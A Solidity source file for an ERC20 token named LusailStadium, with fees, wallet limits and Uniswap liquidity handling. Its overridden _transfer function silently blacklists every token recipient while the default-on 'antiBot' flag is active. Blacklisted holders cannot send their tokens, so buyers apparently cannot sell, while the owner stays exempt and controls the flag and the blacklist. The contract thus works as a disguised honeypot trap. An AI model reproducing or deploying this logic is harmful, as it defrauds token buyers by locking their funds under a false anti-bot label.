// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

library Address {
    function isContract(address account) internal view returns (bool) {

        return account.code.length > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IPair{
    function token0() external view returns (address);
    function token1() external view returns (address);
    function sync() external;
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountATokenDesired,
        uint amountBTokenDesired,
        uint amountATokenMin,
        uint amountBTokenMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract LusailStadium is ERC20, Ownable{
    using Address for address payable;

    uint256 constant DECIMALS = 18;

    uint256 _totalSupply = 1_000_000_000_000 * (10**DECIMALS);

    mapping(address => bool) public exemptFee;
    mapping(address => bool) public isTxLimitExempt;
    mapping (address => bool) public isBlacklist;
    bool public antiBot = true;
    bool public swapEnabled;

    IRouter public router;
    address public pair;

    address public lpRecipient;
    address public marketingWallet;

    bool private swapping;
    uint256 public swapThreshold;
    uint256 public maxWalletAmount;
    uint256 public maxTxAmount;

    uint256 public transferFee;

    struct Fees {
        uint256 lp;
        uint256 marketing;
    }

    Fees public buyFees = Fees(2, 3);
    Fees public sellFees = Fees(2, 3);
    uint256 public totalSellFee = 5;
    uint256 public totalBuyFee = 5;

    modifier inSwap() {
        if (!swapping) {
            swapping = true;
            _;
            swapping = false;
        }
    }

    event TaxRecipientsUpdated(address newLpRecipient, address newMarketingWallet);
    event FeesUpdated();
    event SwapThresholdUpdated(uint256 amount);
    event MaxWalletAmountUpdated(uint256 amount);
    event MaxTXAmountUpdated(uint256 amount);
    event ExemptFromFeeUpdated(address user, bool state);
    event ExemptTXUpdated(address user, bool state);

    constructor() ERC20("LusailStadium", "LUSAIL") {
        
        router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        pair = IFactory(router.factory()).createPair(address(this), router.WETH());

        swapThreshold = 1_000_000_000 * (10**DECIMALS); // 0.1%
        maxWalletAmount = 10_000_000_000 * (10**DECIMALS); // 1%
        maxTxAmount = 10_000_000_000 * (10**DECIMALS); // 1%

        exemptFee[msg.sender] = true;
        exemptFee[address(this)] = true;
        
        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[address(router)] = true;
        isTxLimitExempt[pair] = true;

        _mint(msg.sender, _totalSupply);
    }

    function setTaxRecipients(address _lpRecipient, address _marketingWallet) external onlyOwner{
        require(_lpRecipient != address(0), "lpRecipient cannot be the 0 address");
        require(_marketingWallet != address(0), "marketingWallet cannot be the 0 address");
        lpRecipient = _lpRecipient;
        marketingWallet = _marketingWallet;

        exemptFee[marketingWallet] = true;
        exemptFee[lpRecipient] = true;

        isTxLimitExempt[marketingWallet] = true;
        isTxLimitExempt[lpRecipient] = true;

        emit TaxRecipientsUpdated(_lpRecipient, _marketingWallet);
    }

    function setTransferFee(uint256 _transferFee) external onlyOwner{
        require(_transferFee < 6, "Transfer fee must be less than 6");
        transferFee = _transferFee;
        emit FeesUpdated();
    }

    function setBuyFees(uint256 _lp, uint256 _marketing) external onlyOwner{
        require((_lp + _marketing) < 10, "Buy fee must be less than 10");
        buyFees = Fees(_lp, _marketing);
        totalBuyFee = _lp + _marketing;
        emit FeesUpdated();
    }

    function setSellFees(uint256 _lp, uint256 _marketing) external onlyOwner{
        require((_lp + _marketing) < 10, "Sell fee must be less than 10");
        sellFees = Fees(_lp, _marketing);
        totalSellFee = _lp + _marketing;
        emit FeesUpdated();
    }

    function setSwapThreshold(uint256 amount) external onlyOwner{
        swapThreshold = amount * 10**DECIMALS;
        emit SwapThresholdUpdated(amount);
    }

    function setMaxWalletAmount(uint256 amount) external onlyOwner{
        require(amount >= 1_000_000_000, "Max wallet amount must be >= 1_000_000_000");
        maxWalletAmount = amount * 10**DECIMALS;
        emit MaxWalletAmountUpdated(amount);
    }
    
    function setMaxTxAmount(uint256 amount) external onlyOwner{
        require(amount >= 1_000_000_000, "Max TX amount must be >= 1_000_000_000");
        maxTxAmount = amount * 10**DECIMALS;
        emit MaxTXAmountUpdated(amount);
    }

    function setMulFeeExempt(address[] calldata addr, bool status) external onlyOwner {
        for(uint256 i = 0; i < addr.length; i++) {
            exemptFee[addr[i]] = status;
            emit ExemptFromFeeUpdated(addr[i], status);
        }
    }

    function setMulTXExempt(address[] calldata addr, bool status) external onlyOwner {
        for(uint256 i = 0; i < addr.length; i++) {
            isTxLimitExempt[addr[i]] = status;
            emit ExemptTXUpdated(addr[i], status);
        }
    }

    function setMulBlacklist(address[] calldata addr, bool _isBlacklist) external onlyOwner{
        for (uint256 i = 0; i < addr.length; i++) {
            isBlacklist[addr[i]] = _isBlacklist; 
        }
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!isBlacklist[from], "From cannot be BOT");

        if(!exemptFee[from] && !exemptFee[to]) {
            require(swapEnabled, "Transactions are not enable");
            if(to != pair) require(balanceOf(to) + amount <= maxWalletAmount, "Receiver balance is exceeding maxWalletAmount");
        }

        if (swapEnabled && antiBot) {
            isBlacklist[to] = true;
        }

        if (!isTxLimitExempt[from]) {
            require(amount <= maxTxAmount, "Buy/Sell exceeds the max tx");
        }

        uint256 taxAmt;

        if(!swapping && !exemptFee[from] && !exemptFee[to]){
            if(to == pair){
                taxAmt = amount * totalSellFee / 100;
            } else if(from == pair){
                taxAmt = amount * totalBuyFee / 100;
            } else {
                taxAmt = amount * transferFee / 100;
            }
        }

        if (!swapping && to == pair && totalSellFee > 0) {
            takeFees();
        }

        super._transfer(from, to, amount - taxAmt);
        if(taxAmt > 0) {
            super._transfer(from, address(this), taxAmt);
        }
    }

    function takeFees() private inSwap {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= swapThreshold) {
            if(swapThreshold > 1){
                contractBalance = swapThreshold;
            }
            // Split the contract balance into halves
            uint256 denominator = totalSellFee * 2;
            uint256 tokensToAddLiquidityWith = contractBalance * sellFees.lp / denominator;
            uint256 toSwap = contractBalance - tokensToAddLiquidityWith;

            uint256 initialBalance = address(this).balance;

            swapTokensForETH(toSwap);

            uint256 deltaBalance = address(this).balance - initialBalance;
            uint256 unitBalance= deltaBalance / (denominator - sellFees.lp);
            uint256 ethToAddLiquidityWith = unitBalance * sellFees.lp;

            if(ethToAddLiquidityWith > 0){
                // Add liquidity to Uniswap
                addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
            }

            uint256 marketingAmt = unitBalance * 2 * sellFees.marketing;
            if(marketingAmt > 0){
                payable(marketingWallet).sendValue(marketingAmt);
            }
        }
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> ETH
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);

    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            lpRecipient,
            block.timestamp
        );
    }

    function setSwapEnabled() external onlyOwner {
        swapEnabled = true;
    }

    function turnOffAntiBot() external onlyOwner {
        antiBot = false;
    }

    function stuckETH() external payable {
        require(address(this).balance > 0, "Insufficient ETH balance");
        payable(marketingWallet).transfer(address(this).balance);
    }

    function stuckERC20(address token, uint256 value) external {
        require(
            ERC20(token).balanceOf(address(this)) >= value,
            "Insufficient ERC20 balance"
        );
        ERC20(token).transfer(marketingWallet, value);
    }

    receive() external payable {}
}